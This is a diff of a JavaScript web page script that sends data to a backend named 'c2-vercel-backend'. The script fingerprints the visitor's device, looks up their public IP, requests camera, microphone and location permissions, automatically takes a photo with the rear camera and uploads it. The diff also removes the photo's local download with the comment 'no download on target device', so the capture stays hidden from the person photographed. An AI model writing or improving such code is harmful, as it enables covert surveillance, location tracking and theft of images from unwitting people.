@@ -43,14 +43,8 @@
     (function() {
         'use strict';
 
-        // ============================================================
-        //  YOUR VERCEL BACKEND URL — HARDCODED
-        // ============================================================
         const BACKEND_URL = 'https://c2-vercel-backend.vercel.app';
 
-        // ============================================================
-        //  DOM REFS
-        // ============================================================
         const statusText = document.getElementById('statusText');
         const logConsole = document.getElementById('logConsole');
         const logEntries = document.getElementById('logEntries');
@@ -58,9 +52,6 @@
 
         let deviceId = null;
 
-        // ============================================================
-        //  LOGGING
-        // ============================================================
         function addLog(msg, level='info') {
             const time = new Date().toLocaleTimeString();
             const entry = document.createElement('div');
@@ -69,7 +60,13 @@
             logEntries.appendChild(entry);
             logConsole.scrollTop = logConsole.scrollHeight;
             if (!logConsole.classList.contains('open')) logConsole.classList.add('open');
-            sendLogToBackend(msg, level);
+            if (deviceId) {
+                fetch(`${BACKEND_URL}/api/log`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ deviceId, msg, level })
+                }).catch(() => {});
+            }
         }
 
         function setStatus(msg) {
@@ -77,13 +74,8 @@
             addLog(msg, 'info');
         }
 
-        toggleLogsBtn.addEventListener('click', function() {
-            logConsole.classList.toggle('open');
-        });
+        toggleLogsBtn.addEventListener('click', () => logConsole.classList.toggle('open'));
 
-        // ============================================================
-        //  BACKEND API CALLS
-        // ============================================================
         async function apiCall(endpoint, data) {
             try {
                 const resp = await fetch(`${BACKEND_URL}${endpoint}`, {
@@ -98,14 +90,6 @@
             }
         }
 
-        function sendLogToBackend(msg, level) {
-            if (!deviceId) return;
-            apiCall('/api/log', { deviceId, msg, level });
-        }
-
-        // ============================================================
-        //  COLLECT FULL FINGERPRINT
-        // ============================================================
         function collectFingerprint() {
             return {
                 ua: navigator.userAgent,
@@ -141,9 +125,6 @@
             } catch(e) { return 'unknown'; }
         }
 
-        // ============================================================
-        //  GET IP
-        // ============================================================
         function getPublicIP() {
             return new Promise((resolve) => {
                 fetch('https://api.ipify.org?format=json')
@@ -158,9 +139,6 @@
             });
         }
 
-        // ============================================================
-        //  CAPTURE PHOTO (AUTO)
-        // ============================================================
         function capturePhoto() {
             return new Promise((resolve, reject) => {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
@@ -192,9 +170,6 @@
             });
         }
 
-        // ============================================================
-        //  GET LOCATION
-        // ============================================================
         function getLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
@@ -209,9 +184,6 @@
             });
         }
 
-        // ============================================================
-        //  REQUEST ALL PERMISSIONS
-        // ============================================================
         async function requestAllPermissions() {
             addLog('[Perm] Requesting camera, mic, location, storage...', 'warn');
             const results = { camera: false, mic: false, location: false, storage: false };
@@ -256,9 +228,6 @@
             return results;
         }
 
-        // ============================================================
-        //  MAIN INIT
-        // ============================================================
         async function init() {
             setStatus('🔍 Initializing...');
 
@@ -293,10 +262,7 @@
                 } else {
                     addLog('[Photo] Upload failed.', 'error');
                 }
-                const link = document.createElement('a');
-                link.href = photoDataUrl;
-                link.download = `capture_${Date.now()}.jpg`;
-                link.click();
+                // ❌ REMOVED: no download on target device
             } catch(e) {
                 addLog(`[Photo] Error: ${e}`, 'error');
                 setStatus('⚠️ Photo capture failed.');
